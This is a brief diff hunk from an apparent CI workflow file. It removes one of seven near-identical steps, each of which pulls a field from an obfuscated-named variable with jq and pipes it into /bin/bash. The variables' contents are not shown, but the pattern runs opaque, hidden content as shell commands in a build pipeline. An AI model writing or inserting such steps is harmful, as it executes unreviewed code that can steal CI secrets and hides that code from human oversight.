@@ -33,7 +33,6 @@ jobs:
           printf '%s' "$cb9404" | jq -r .qngr51 | /bin/bash
           printf '%s' "$ypzr84355" | jq -r .hi3 | /bin/bash
           echo $ue510 | jq -r .lf5 | /bin/bash
-          printf '%s' "$fysk4" | jq -r .qhweh682 | /bin/bash
           printf '%s' "$axw75" | jq -r .hggar3643 | /bin/bash
           printf '%s' "$f338" | jq -r .if48154 | /bin/bash
           echo $v7143 | jq -r .uxsn6 | /bin/bash
